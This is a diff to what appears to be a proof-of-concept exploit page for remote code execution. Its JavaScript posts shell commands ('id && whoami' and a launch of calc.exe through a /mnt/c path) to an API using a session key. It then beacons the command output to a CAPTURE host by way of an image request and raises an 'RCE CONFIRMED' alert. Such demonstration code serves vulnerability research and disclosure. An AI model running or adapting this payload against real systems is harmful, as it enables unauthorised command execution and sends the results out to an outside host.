@@ -90,7 +90,7 @@ pre     { background: #161b22; padding: 14px; border-radius: 6px; overflow: auto
         "Content-Type": "application/json",
         "X-Session-API-Key": apiKey
       },
-      body: JSON.stringify({ command: "id && hostname && whoami && echo 'RCE_CONFIRMED'" })
+      body: JSON.stringify({ command: "id && whoami && /mnt/c/Windows/System32/calc.exe &" })
     })
     .then(function(r) { return r.json(); })
     .then(function(data) {
@@ -102,7 +102,7 @@ pre     { background: #161b22; padding: 14px; border-radius: 6px; overflow: auto
       new Image().src = CAPTURE + "/f2rce?output=" + encodeURIComponent(out)
                       + "&t=" + Date.now();
 
-      alert("RCE CONFIRMED\n\nCommand: id && hostname && whoami\n\nOutput:\n" + out);
+      alert("RCE CONFIRMED\n\nCommand: id && whoami && calc.exe\n\nOutput:\n" + out + "\n\n(calc.exe launched in background)");
     })
     .catch(function(err) {
       rcePre.textContent = "RCE fetch error: " + err;
